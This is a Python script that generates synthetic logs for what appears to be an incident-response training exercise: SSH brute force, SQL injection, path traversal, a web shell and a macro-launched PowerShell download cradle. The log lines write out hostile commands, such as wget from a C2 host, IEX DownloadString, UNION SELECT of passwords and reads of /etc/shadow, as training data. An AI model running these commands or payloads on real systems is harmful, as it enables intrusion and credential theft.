#!/usr/bin/env python3
"""Generates SYNTHETIC logs for a training scenario.
All IPs are RFC 5737 documentation ranges or RFC 1918 private ranges."""
import random, base64, csv, os
random.seed(7)
L = os.path.dirname(os.path.abspath(__file__))
ATT, ATT2, C2 = "203.0.113.45", "192.0.2.88", "198.51.100.77"

# ---------------- auth.log (Linux web01) ----------------
a = []
def au(t, msg): a.append((t, f"Oct 27 {t} web01 {msg}"))
au("01:14:09", "sshd[1802]: Accepted publickey for alice from 10.0.0.5 port 40122 ssh2")
au("01:14:09", "sshd[1802]: pam_unix(sshd:session): session opened for user alice by (uid=0)")
au("02:40:55", "sshd[1950]: Failed password for bob from 10.0.0.9 port 50311 ssh2")
au("02:41:07", "sshd[1950]: Accepted password for bob from 10.0.0.9 port 50311 ssh2")
users = ["root","admin","test","ubuntu","oracle","git","postgres","deploy","deploy","deploy"]
s = 12*60
for i in range(42):
    s += random.randint(3, 9)
    u = users[i % len(users)]
    inv = "invalid user " if u in ("admin","test","oracle") else ""
    au(f"03:{s//60:02d}:{s%60:02d}", f"sshd[{2200+i}]: Failed password for {inv}{u} from {ATT} port {51000+i} ssh2")
au("03:19:42", f"sshd[2301]: Accepted password for deploy from {ATT} port 52001 ssh2")
au("03:19:42", "sshd[2301]: pam_unix(sshd:session): session opened for user deploy by (uid=0)")
au("03:20:15", "sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id")
au("03:21:03", f"sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://{C2}/x.sh -O /tmp/.x.sh")
au("03:21:30", "sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.x.sh")
au("03:22:01", "useradd[2388]: new user: name=svc_backup, UID=1005, GID=1005, home=/home/svc_backup, shell=/bin/bash")
au("03:22:09", "usermod[2391]: add 'svc_backup' to group 'sudo'")
au("03:22:40", "sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -l -u root")
au("03:23:02", "CRON[2402]: pam_unix(cron:session): session opened for user root by (uid=0)")
au("03:31:50", "sshd[2420]: pam_unix(sshd:session): session closed for user deploy")
au("08:02:11", "sshd[2900]: Accepted publickey for alice from 10.0.0.5 port 41200 ssh2")
a.sort(key=lambda x: x[0])
open(f"{L}/auth.log","w").write("\n".join(x[1] for x in a)+"\n")

# ---------------- apache access.log ----------------
UA_N = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0", "Mozilla/5.0 (Macintosh) Safari/605.1.15", "Mozilla/5.0 (iPhone) Mobile Safari/604.1"]
r = []
def ap(t, ip, req, st, sz, ua): r.append((t, f'{ip} - - [27/Oct/2026:{t} +0000] "{req}" {st} {sz} "-" "{ua}"'))
for i in range(22):
    t = f"{random.randint(0,2):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}"
    ap(t, f"10.0.2.{random.randint(10,60)}", random.choice(["GET / HTTP/1.1","GET /products HTTP/1.1","GET /css/site.css HTTP/1.1","POST /login.php HTTP/1.1"]), 200, random.randint(500,9000), random.choice(UA_N))
for i, p in enumerate(["/admin/","/phpmyadmin/","/.git/config","/backup.zip","/wp-login.php","/server-status"]):
    ap(f"02:5{i}:0{i}", ATT, f"GET {p} HTTP/1.1", 404 if i != 5 else 403, 300, "Mozilla/5.00 (Nikto/2.5.0)")
for i, q in enumerate(["1'","1' OR '1'='1","1' UNION SELECT NULL,username,password FROM users--","1; DROP TABLE users--","1' AND SLEEP(5)--"]):
    ap(f"02:58:{10+i}", ATT, f"GET /product.php?id={q.replace(' ','%20')} HTTP/1.1", 500 if i < 2 else 200, 1200+i*400, "sqlmap/1.7.2#stable (https://sqlmap.org)")
for i, p in enumerate(["/download.php?file=../../../../etc/passwd","/download.php?file=..%2f..%2f..%2fetc%2fshadow","/download.php?file=....//....//etc/hosts"]):
    ap(f"03:0{i}:21", ATT2, f"GET {p} HTTP/1.1", [200,403,200][i], [1843,199,312][i], "curl/8.1.2")
ap("03:05:40", ATT2, "POST /upload.php HTTP/1.1", 200, 88, "curl/8.1.2")
ap("03:06:02", ATT2, "GET /uploads/shell.php?cmd=whoami HTTP/1.1", 200, 9, "curl/8.1.2")
r.sort(key=lambda x: x[0])
open(f"{L}/apache_access.log","w").write("\n".join(x[1] for x in r)+"\n")

# ---------------- firewall.log ----------------
f = []
def fw(t, act, d, src, dst, proto, dpt): f.append(f"2026-10-27T{t}Z {act} {d} SRC={src} DST={dst} PROTO={proto} DPT={dpt}")
fw("01:10:00","ACCEPT","OUT","10.0.1.20","8.8.8.8","UDP",53)
fw("02:30:12","DENY","IN","198.51.100.200","10.0.1.20","TCP",23)
for i in range(5): fw(f"03:12:{10+i*8:02d}","ACCEPT","IN",ATT,"10.0.1.20","TCP",22)
fw("03:21:01","ACCEPT","OUT","10.0.1.20",C2,"TCP",80)
for i in range(12): fw(f"03:{24+i:02d}:11","ACCEPT","OUT","10.0.1.20",C2,"TCP",4444)
fw("03:40:30","ACCEPT","OUT","10.0.1.20","10.0.1.35","TCP",445)
fw("03:40:31","DENY","OUT","10.0.1.20","10.0.1.36","TCP",445)
fw("09:00:00","ACCEPT","OUT","10.0.1.20","8.8.8.8","UDP",53)
open(f"{L}/firewall.log","w").write("\n".join(f)+"\n")

# ---------------- windows_security.csv (WS-014) ----------------
cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{C2}/a.ps1')"
enc = base64.b64encode(cmd.encode("utf-16le")).decode()
rows = [
 ["2026-10-27T07:55:01Z",4624,"WS-014","jsmith","LogonType=2 SourceIP=-"],
 ["2026-10-27T08:41:17Z",4688,"WS-014","jsmith","NewProcess=WINWORD.EXE Parent=explorer.exe CmdLine=WINWORD.EXE \"Invoice_Q3.docm\""],
 ["2026-10-27T08:41:29Z",4688,"WS-014","jsmith",f"NewProcess=powershell.exe Parent=WINWORD.EXE CmdLine=powershell.exe -nop -w hidden -enc {enc}"],
 ["2026-10-27T08:41:35Z",4688,"WS-014","jsmith","NewProcess=whoami.exe Parent=powershell.exe CmdLine=whoami /all"],
 ["2026-10-27T08:42:10Z",4698,"WS-014","jsmith","ScheduledTask=\\Updater Action=powershell.exe -w hidden -File C:\\Users\\jsmith\\AppData\\Roaming\\u.ps1"],
]
for i in range(8):
    rows.append([f"2026-10-27T04:0{i}:1{i}Z",4625,"WS-014","Administrator",f"LogonType=10 SourceIP={ATT2} Status=0xC000006D"])
rows.append(["2026-10-27T04:09:30Z",4625,"WS-014","jsmith",f"LogonType=10 SourceIP={ATT2} Status=0xC000006A"])
rows.sort(key=lambda x: x[0])
w = csv.writer(open(f"{L}/windows_security.csv","w",newline=""))
w.writerow(["TimeCreated","EventID","Computer","Account","Details"]); w.writerows(rows)
print("logs generated")
